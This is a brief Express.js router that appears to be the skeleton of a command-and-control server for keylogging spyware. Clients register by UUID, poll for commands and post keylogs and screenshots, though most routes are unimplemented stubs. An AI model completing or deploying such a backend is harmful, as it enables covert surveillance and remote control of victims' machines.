'use strict'

const express = require('express')
const router = express.Router()
const clientService = require('../../services/clients')

//At clients connections
router.put('/:uuid', (req, res) => {
    const { isNew, data } = clientService.createOrUpdate(req.params.uuid)
    res.status(isNew ? 201 : 200).json(data)
})

//At clients polling for retriving the commands list
router.get('/:uuid/commands', (req, res) => {
    res.status(200).json({})
})

//At clients sending keylogs
router.post('/:uuid/keylogs', (req, res) => {
    res.status(501).json({})
})

//At clients sending screenshots
router.post('/:uuid/commands', (req, res) => {
    res.status(501).json({})
})
module.exports = router